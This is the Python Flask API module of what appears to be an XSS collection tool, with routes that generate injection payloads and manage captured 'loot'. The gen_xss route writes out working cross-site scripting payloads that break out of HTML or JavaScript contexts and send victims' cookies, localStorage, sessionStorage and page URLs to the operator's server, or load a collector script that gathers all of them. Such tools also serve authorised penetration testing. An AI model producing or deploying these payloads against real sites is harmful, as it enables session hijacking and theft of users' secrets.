from flask import jsonify, request, Response
from app import db
from app.models import Client, XSS
from app.api import bp
from flask_login import login_required, current_user

import json

@bp.route('/xss/generate/<id>', methods=['GET'])
@login_required
def gen_xss(id):

    client = Client.query.filter_by(id=id).first_or_404()
    uid = client.uid
    parameters = request.args.to_dict()
    other_data = ''
    xss_type = 'r'
    require_js = False
    require_params = False
    cookies = False
    local_storage = False
    session_storage = False
    get_url = False
    i_want_it_all = False
    code_type = 'html'

    for param, value in parameters.items():


        if param == 'url':
            url = value
        elif param == 'i_want_it_all':
            i_want_it_all = True
        elif param == 'stored':
            xss_type = 's'
        elif param == 'cookies':
            cookies = True
            require_js = True
            require_params = True
        elif param == 'local_storage':
            local_storage = True
            require_js = True
            require_params = True
        elif param == 'session_storage':
            session_storage = True
            require_js = True
            require_params = True
        elif param == 'code':
            if value == 'html':
                code_type = 'html'
            elif value == 'js':
                code_type = 'js'
                require_js = True
            else:
                return jsonify({'status': 'error', 'detail': 'Unknown code type'}), 400
        elif param == 'geturl':
            get_url = True
            require_js = True
            require_params = True
        else:
            if other_data != '':
                other_data += '&'
            other_data += '{}={}'.format(param, value)
            require_params = True


    if i_want_it_all:
        if code_type == 'js':
            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(url, url, xss_type, uid, other_data)
            return (payload), 200
        else:
            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(url, url, xss_type, uid, other_data)
            return (payload), 200

    if code_type == 'js':
        payload = ';};new Image().src="'
    else:
        payload = """'>">"""
        if require_js:
            payload += '<script>new Image().src="'
        else:
            payload += '<img src="'


    payload += '{}/api/x/{}/{}'.format(url, xss_type, uid)

    if require_params:
        payload += '?'

        if cookies:
            payload += 'cookies="+encodeURIComponent(document.cookie)'

        if local_storage:
            if cookies:
                payload += '+"&'
            payload += 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'

        if session_storage:
            if cookies or local_storage:
                payload += '+"&'
            payload += 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))'

        if get_url:
            if cookies or local_storage or session_storage:
                payload += '+"&'
            payload += 'origin_url="+encodeURIComponent(location.href)'

        if other_data != '':
            if cookies or local_storage or session_storage or get_url:
                payload += '+"&'
            payload += other_data
            payload += '"'

    if not require_params:
        payload += '"'

    if code_type == 'js':
        payload += ';'
    else:
        if require_js:
            payload += '</script>'
        else:
            payload += ' />'

    return (payload), 200


@bp.route('/xss/<id>', methods=['DELETE'])
@login_required
def delete_xss(id):

    xss = XSS.query.filter_by(id=id).first_or_404()

    if current_user.id != xss.client.owner_id and not current_user.is_admin:
        return jsonify({'status': 'error', 'detail': 'Can\'t delete someone else\'s XSS'}), 403

    db.session.delete(xss)
    db.session.commit()

    return jsonify({'status': 'OK'}), 200


@bp.route('/xss/<id>/<loot_type>', methods=['GET', 'DELETE'])
@login_required
def loot(id, loot_type):

    if request.method == 'DELETE':

        xss = XSS.query.filter_by(id=id).first_or_404()

        if current_user.id != xss.client.owner_id and not current_user.is_admin:
            return jsonify({'status': 'error', 'detail': 'Can\'t delete someone else\'s data'}), 403

        data = json.loads(xss.data)

        data.pop(loot_type, None)

        xss.data = json.dumps(data)

        db.session.commit()

        return jsonify({'status': 'OK'}), 200

    elif request.method == 'GET':

        xss = XSS.query.filter_by(id=id).first_or_404()

        data = json.loads(xss.data)
        
        return jsonify({'data': data[loot_type]}), 200
